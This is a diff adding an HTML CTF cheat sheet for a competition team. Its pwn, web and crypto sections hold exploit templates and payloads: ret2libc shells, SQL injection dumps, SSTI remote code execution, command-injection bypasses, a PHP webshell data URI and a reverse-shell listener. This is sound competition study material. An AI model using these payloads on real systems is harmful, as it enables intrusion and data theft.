@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>CTF Ultimate Command Reference — TEAM UNFINDABLES (FIN-030)</title>
+<style>
+@media print { body { font-size: 9pt; } h1 { font-size: 16pt; } h2 { font-size: 13pt; page-break-after: avoid; } h3 { font-size: 11pt; } pre { font-size: 8pt; } .pagebreak { page-break-before: always; } }
+body { font-family: 'Segoe UI', Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; background: #0d1117; color: #c9d1d9; line-height: 1.5; }
+h1 { color: #58a6ff; border-bottom: 2px solid #58a6ff; padding-bottom: 8px; text-align: center; }
+h2 { color: #ff7b72; border-bottom: 1px solid #30363d; padding-bottom: 4px; margin-top: 28px; }
+h3 { color: #79c0ff; margin-top: 16px; }
+pre { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 10px; overflow-x: auto; color: #7ee787; font-family: 'Cascadia Code', 'Fira Code', monospace; }
+code { background: #161b22; padding: 2px 5px; border-radius: 3px; color: #ffa657; }
+table { width: 100%; border-collapse: collapse; margin: 10px 0; }
+th { background: #161b22; color: #58a6ff; padding: 6px 8px; text-align: left; border: 1px solid #30363d; }
+td { padding: 5px 8px; border: 1px solid #30363d; color: #c9d1d9; }
+tr:nth-child(even) { background: #161b22; }
+.tip { background: #0d2818; border-left: 4px solid #3fb950; padding: 8px 12px; margin: 8px 0; border-radius: 4px; }
+.warn { background: #2d1b00; border-left: 4px solid #d29922; padding: 8px 12px; margin: 8px 0; border-radius: 4px; }
+</style>
+</head>
+<body>
+
+<h1>&#9876; CTF ULTIMATE COMMAND REFERENCE</h1>
+<p style="text-align:center;color:#8b949e;">TEAM UNFINDABLES (FIN-030) | InCTF 2026 Finals | Print: Ctrl+P &rarr; Save as PDF</p>
+
+<!-- ============================================================ -->
+<h2>1. INITIAL FILE TRIAGE (Run These FIRST on Any Challenge)</h2>
+<!-- ============================================================ -->
+<pre>
+file challenge.*                    # What type of file is this?
+strings -n 8 challenge | head -50   # Quick readable strings
+strings challenge | grep -i "flag\|inctf\|pass\|key\|secret"
+xxd challenge | head -20            # Hex dump header
+binwalk challenge                   # Scan for embedded files
+binwalk -e challenge                # Extract embedded files
+exiftool image.jpg                  # Metadata (comments, GPS, author)
+</pre>
+
+<h3>Magic Bytes Quick Reference</h3>
+<table>
+<tr><th>Type</th><th>Hex Header</th><th>ASCII</th></tr>
+<tr><td>PNG</td><td>89 50 4E 47 0D 0A 1A 0A</td><td>.PNG....</td></tr>
+<tr><td>JPEG</td><td>FF D8 FF</td><td>...</td></tr>
+<tr><td>GIF</td><td>47 49 46 38</td><td>GIF8</td></tr>
+<tr><td>ZIP/DOCX</td><td>50 4B 03 04</td><td>PK..</td></tr>
+<tr><td>PDF</td><td>25 50 44 46</td><td>%PDF</td></tr>
+<tr><td>ELF</td><td>7F 45 4C 46</td><td>.ELF</td></tr>
+<tr><td>PCAP</td><td>D4 C3 B2 A1</td><td>...</td></tr>
+<tr><td>RAR</td><td>52 61 72 21</td><td>Rar!</td></tr>
+<tr><td>7z</td><td>37 7A BC AF 27 1C</td><td>7z...</td></tr>
+<tr><td>GZIP</td><td>1F 8B</td><td>..</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<div class="pagebreak"></div>
+<h2>2. BINARY EXPLOITATION (PWN)</h2>
+<!-- ============================================================ -->
+
+<h3>2.1 Security Check</h3>
+<pre>
+checksec --file=./binary
+# Canary = Stack cookie | NX = No-Execute stack | PIE = Random base | RELRO = GOT protection
+</pre>
+
+<h3>2.2 GDB / Pwndbg Commands</h3>
+<pre>
+gdb ./binary                       # Start debugger
+r                                  # Run
+r &lt; &lt;(python3 -c "print('A'*200)") # Run with crafted input
+b *main                            # Breakpoint at main
+b *0x401234                        # Breakpoint at address
+info functions                     # List ALL functions (find win/backdoor!)
+disas main                         # Disassemble main
+x/20gx $rsp                        # Examine stack (20 quadwords, hex)
+x/s 0x404040                       # Read string at address
+vmmap                              # Memory map (pwndbg)
+search /bin/sh                     # Search memory for string
+cyclic 200                         # Generate offset pattern
+cyclic -l 0x6161616a               # Find exact overflow offset
+</pre>
+
+<h3>2.3 Ret2Win Template (64-bit)</h3>
+<pre>
+from pwn import *
+elf = context.binary = ELF('./challenge')
+p = process('./challenge')  # or remote('IP', PORT)
+
+offset = 72                # Found via cyclic
+ret = 0x40101a              # 'ret' gadget for stack alignment
+win = elf.symbols['win']    # or hardcoded address
+
+payload = flat({ offset: [ret, win] })
+p.sendline(payload)
+p.interactive()
+</pre>
+
+<h3>2.4 Ret2Libc (Leak + Shell)</h3>
+<pre>
+from pwn import *
+elf = context.binary = ELF('./challenge')
+libc = ELF('./libc.so.6')
+p = process('./challenge')
+rop = ROP(elf)
+
+POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
+RET     = rop.find_gadget(['ret'])[0]
+offset  = 72
+
+# STAGE 1: Leak puts address
+pay1 = flat({ offset: [POP_RDI, elf.got['puts'], elf.plt['puts'], elf.symbols['main']] })
+p.sendline(pay1)
+leaked = u64(p.recv(6).ljust(8, b'\x00'))
+libc.address = leaked - libc.symbols['puts']
+
+# STAGE 2: system('/bin/sh')
+pay2 = flat({ offset: [RET, POP_RDI, next(libc.search(b'/bin/sh')), libc.symbols['system']] })
+p.sendline(pay2)
+p.interactive()
+</pre>
+
+<h3>2.5 Format String</h3>
+<pre>
+# Find offset: send AAAA.%p.%p.%p... until you see 0x41414141
+# Direct read:  %6$p  (leak 6th stack value)
+# Leak canary:  %11$p or %13$p or %15$p
+# Read string:  %6$s
+
+# Arbitrary write with pwntools:
+from pwn import *
+payload = fmtstr_payload(offset, {target_addr: value_to_write})
+</pre>
+
+<h3>2.6 Shellcode (NX Disabled)</h3>
+<pre>
+from pwn import *
+context.arch = 'amd64'
+shellcode = asm(shellcraft.sh())
+# Pad shellcode + overflow + jump to buffer address
+</pre>
+
+<!-- ============================================================ -->
+<div class="pagebreak"></div>
+<h2>3. WEB EXPLOITATION</h2>
+<!-- ============================================================ -->
+
+<h3>3.1 SQL Injection</h3>
+<pre>
+# Auth Bypass:
+admin' -- -
+' OR 1=1-- -
+admin' or '1'='1'-- -
+
+# Find columns:    ' ORDER BY 1-- -  (increment until error)
+# UNION (MySQL):   ' UNION SELECT 1,version(),user()-- -
+# Extract tables:  ' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
+# Extract columns: ' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
+# Dump data:       ' UNION SELECT 1,group_concat(username,':',password),3 FROM users-- -
+
+# SQLite:
+' UNION SELECT 1,sql,3 FROM sqlite_master WHERE type='table'-- -
+
+# Blind (Time):
+' OR IF(ascii(substr((SELECT flag FROM secret),1,1))=105, SLEEP(5), 0)-- -
+</pre>
+
+<h3>3.2 SSTI (Server-Side Template Injection)</h3>
+<pre>
+# Detection: {{7*7}} -> 49?  or ${7*7} or &lt;%= 7*7 %&gt;
+
+# Jinja2 (Flask/Python) RCE:
+{{config.__class__.__init__.__globals__['os'].popen('cat flag*').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# Twig (PHP):
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat flag.txt")}}
+
+# Node.js EJS:
+&lt;%= global.process.mainModule.require('child_process').execSync('cat flag') %&gt;
+</pre>
+
+<h3>3.3 Command Injection</h3>
+<pre>
+; cat flag.txt
+| cat flag.txt
+$(cat flag.txt)
+`cat flag.txt`
+
+# Bypass space filter:  cat${IFS}flag.txt  or  {cat,flag.txt}
+# Bypass keyword:       c\a\t f\l\a\g.txt  or  c""at fl""ag.txt
+# Bypass everything:    echo "Y2F0IGZsYWcudHh0" | base64 -d | sh
+</pre>
+
+<h3>3.4 LFI / Path Traversal</h3>
+<pre>
+../../../../../../etc/passwd
+# PHP source read:  php://filter/convert.base64-encode/resource=flag.php
+# PHP RCE:          data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&amp;c=id
+</pre>
+
+<h3>3.5 JWT Attacks</h3>
+<pre>
+# 1. Algorithm None: Change header "alg":"HS256" -> "alg":"none", remove signature
+# 2. Crack weak secret: john jwt.txt --format=HMAC-SHA256 --wordlist=rockyou.txt
+</pre>
+
+<h3>3.6 SSRF Localhost Bypasses</h3>
+<pre>
+http://127.0.0.1  http://localhost  http://0.0.0.0  http://127.1
+http://2130706433  http://[::1]  http://localtest.me
+</pre>
+
+<!-- ============================================================ -->
+<div class="pagebreak"></div>
+<h2>4. CRYPTOGRAPHY</h2>
+<!-- ============================================================ -->
+
+<h3>4.1 RSA Attacks</h3>
+<pre>
+# Small e (e=3, no padding): m = iroot(c, e)
+import gmpy2
+from Crypto.Util.number import long_to_bytes
+m, exact = gmpy2.iroot(c, e)
+if exact: print(long_to_bytes(m))
+
+# Fermat (p ≈ q):
+a = gmpy2.isqrt(n) + 1
+while not gmpy2.is_square(a*a - n): a += 1
+b = gmpy2.isqrt(a*a - n); p = a-b; q = a+b
+
+# Wiener (small d): use owiener library
+import owiener; d = owiener.attack(e, n)
+
+# Common Modulus (same n, different e1/e2):
+# Use extended GCD to combine c1^s1 * c2^s2 mod n
+
+# Factorize n online (before comp): factordb.com
+# Offline: use yafu or msieve
+</pre>
+
+<h3>4.2 XOR</h3>
+<pre>
+# Single-byte brute:
+for k in range(256):
+    pt = bytes([b^k for b in cipher])
+    if b"inctf" in pt.lower(): print(f"Key={k}: {pt}")
+
+# Known-plaintext crib drag:
+key = bytes([c^k for c,k in zip(cipher, b"inctf{")])
+</pre>
+
+<h3>4.3 Hash Cracking</h3>
+<table>
+<tr><th>Hash</th><th>Length</th><th>Hashcat -m</th><th>John --format</th></tr>
+<tr><td>MD5</td><td>32 hex</td><td>0</td><td>raw-md5</td></tr>
+<tr><td>SHA1</td><td>40 hex</td><td>100</td><td>raw-sha1</td></tr>
+<tr><td>SHA256</td><td>64 hex</td><td>1400</td><td>raw-sha256</td></tr>
+<tr><td>NTLM</td><td>32 hex</td><td>1000</td><td>nt</td></tr>
+<tr><td>bcrypt</td><td>$2a$...</td><td>3200</td><td>bcrypt</td></tr>
+</table>
+<pre>
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+john hash.txt --wordlist=rockyou.txt
+zip2john secret.zip > h.txt &amp;&amp; john h.txt --wordlist=rockyou.txt
+</pre>
+
+<!-- ============================================================ -->
+<div class="pagebreak"></div>
+<h2>5. FORENSICS &amp; STEGANOGRAPHY</h2>
+<!-- ============================================================ -->
+
+<h3>5.1 Image Stego</h3>
+<pre>
+# PNG/BMP LSB:
+zsteg -a image.png                  # King of PNG stego — tries all LSB combos
+
+# JPEG:
+steghide extract -sf image.jpg      # Try blank password first (press Enter)
+stegseek image.jpg rockyou.txt      # Brute-force passphrase in &lt;1 second!
+outguess -r image.jpg output.txt    # Outguess extraction
+
+# PNG dimension trick (corrupted IHDR):
+pngcheck -v image.png               # Shows CRC errors if width/height was changed
+# Fix: Edit IHDR width/height bytes in hex editor, recalculate CRC
+</pre>
+
+<h3>5.2 Audio Stego</h3>
+<pre>
+# Open in Audacity -> Track dropdown -> Spectrogram view -> Look for hidden text!
+# SSTV (Slow-Scan TV): decode with qsstv or online SSTV decoder
+# Morse Code: Listen for dits and dahs, decode manually or use tool
+</pre>
+
+<h3>5.3 PCAP / Network</h3>
+<pre>
+# Wireshark: File -> Export Objects -> HTTP/SMB/TFTP
+# Follow TCP Stream: Right-click packet -> Follow -> TCP Stream
+
+# TShark CLI:
+tshark -r cap.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
+tshark -r cap.pcap -Y "dns.flags.response==0" -T fields -e dns.qry.name | sort -u
+tshark -r cap.pcap --export-objects http,./out/
+
+# DNS Exfiltration: Look for long base64-like subdomains in DNS queries
+# ICMP Tunneling: Extract data field from ICMP packets
+tshark -r cap.pcap -Y "icmp" -T fields -e data | xxd -r -p
+</pre>
+
+<h3>5.4 Memory Forensics (Volatility 3)</h3>
+<pre>
+vol -f mem.raw windows.info              # OS info
+vol -f mem.raw windows.pslist            # Running processes
+vol -f mem.raw windows.cmdline.CmdLine   # Command lines
+vol -f mem.raw windows.hashdump          # Password hashes
+vol -f mem.raw windows.filescan | grep -i "flag\|secret\|desktop"
+vol -f mem.raw windows.dumpfiles --virtaddr 0xADDRESS
+vol -f mem.raw linux.bash.Bash           # Linux bash history
+</pre>
+
+<!-- ============================================================ -->
+<div class="pagebreak"></div>
+<h2>6. REVERSE ENGINEERING</h2>
+<!-- ============================================================ -->
+
+<h3>6.1 Static Analysis</h3>
+<pre>
+file binary                         # Architecture, linking, stripped?
+strings -n 8 binary | grep -i flag  # Quick string search
+objdump -d binary | less            # Disassemble
+nm binary                           # List symbols (functions)
+ltrace ./binary                     # Trace library calls (strcmp, memcmp!)
+strace ./binary                     # Trace system calls (open, read, write)
+floss ./binary                      # Extract obfuscated strings (better than strings!)
+capa ./binary                       # Auto-detect capabilities (anti-debug, crypto, etc.)
+</pre>
+
+<h3>6.2 Ghidra Headless Decompile</h3>
+<pre>
+# Use our script to auto-dump C pseudo-code without opening GUI:
+python3 ghidra_decompile.py ./binary
+# Output: ./binary.c  (grep for strcmp, flag, main, check, verify)
+</pre>
+
+<h3>6.3 Dynamic Analysis with ltrace</h3>
+<pre>
+# Our tool auto-feeds input and catches strcmp/memcmp comparisons:
+python3 rev_cracker.py ./crackme
+# If it prints the flag from strcmp, you're done!
+</pre>
+
+<h3>6.4 Angr Symbolic Execution</h3>
+<pre>
+# 1. Open binary in Ghidra, find address of "Success!" print -> SUCCESS_ADDR
+# 2. Find address of "Wrong!" print -> FAIL_ADDR
+# 3. Edit angr_template.py with those addresses and run it
+python3 angr_template.py ./hard_crackme
+</pre>
+
+<h3>6.5 Anti-Debug Bypass (GDB)</h3>
+<pre>
+# If binary calls ptrace(PTRACE_TRACEME) to detect debugger:
+# In GDB: catch syscall ptrace
+# Then: set $rax = 0    (fake success return)
+# Or patch the binary: NOP out the ptrace call
+</pre>
+
+<!-- ============================================================ -->
+<div class="pagebreak"></div>
+<h2>7. ENCODING / DECODING QUICK REFERENCE</h2>
+<!-- ============================================================ -->
+<pre>
+# Base64:
+echo "aW5jdGZ7dGVzdH0=" | base64 -d
+echo "test" | base64
+
+# Hex:
+echo "696e637466" | xxd -r -p
+echo -n "inctf" | xxd -p
+
+# URL Decode:
+python3 -c "import urllib.parse; print(urllib.parse.unquote('%69%6e%63%74%66'))"
+
+# ROT13:
+echo "vapgs{grfg}" | tr 'a-zA-Z' 'n-za-mN-ZA-M'
+
+# Binary to ASCII:
+python3 -c "print(''.join(chr(int(b,2)) for b in '01101000 01101001'.split()))"
+
+# Decimal to ASCII:
+python3 -c "print(''.join(chr(int(x)) for x in '105 110 99 116 102'.split()))"
+
+# Multi-layer auto-decode (our tool):
+python3 decoder.py "aW5jdGZ7dGVzdH0="
+</pre>
+
+<!-- ============================================================ -->
+<h2>8. LINUX TERMINAL ESSENTIALS</h2>
+<!-- ============================================================ -->
+<pre>
+# Navigation & Search:
+find . -name "*.txt" -exec grep -l "flag" {} +
+grep -rni "inctf{" .
+locate flag.txt
+
+# File Transfer (Host &lt;-&gt; Kali VM):
+python3 -m http.server 8000          # On sender
+wget http://10.0.2.2:8000/file       # On receiver (VirtualBox NAT)
+
+# Networking:
+netstat -tulpn                       # Open ports
+curl http://target:8080/api          # HTTP request
+nc -lvnp 4444                       # Listen for reverse shell
+nc target 9001                       # Connect to service
+
+# Permissions:
+chmod +x script.sh
+chmod 777 folder/
+
+# Python without sudo:
+pip install --user pwntools pycryptodome
+</pre>
+
+<!-- ============================================================ -->
+<h2>9. PWNTOOLS CHEATSHEET</h2>
+<!-- ============================================================ -->
+<pre>
+from pwn import *
+context.binary = ELF('./binary')     # Set architecture automatically
+p = process('./binary')              # Local
+p = remote('ip', port)               # Remote
+
+p.sendline(b"data")                  # Send with newline
+p.send(b"data")                      # Send without newline
+p.recvuntil(b"prompt: ")             # Wait for prompt
+p.recvline()                         # Receive one line
+p.interactive()                      # Drop to interactive shell
+
+p32(0xdeadbeef)                      # Pack 32-bit little-endian
+p64(0xdeadbeef)                      # Pack 64-bit little-endian
+u32(data)                            # Unpack 32-bit
+u64(data.ljust(8, b'\x00'))          # Unpack 64-bit (pad to 8 bytes)
+
+flat({ 72: [ret, win] })             # Build payload with offset
+cyclic(200)                          # Generate offset pattern
+cyclic_find(0x6161616a)              # Find offset from crash value
+
+rop = ROP(elf)                       # Auto-find ROP gadgets
+rop.find_gadget(['pop rdi', 'ret'])  # Find specific gadget
+</pre>
+
+<hr>
+<p style="text-align:center;color:#8b949e;font-size:10pt;">
+&#9876; TEAM UNFINDABLES (FIN-030) — InCTF 2026 Finals<br>
+This document is public reference material (Rule 14 compliant). Print with Ctrl+P.
+</p>
+</body>
+</html>
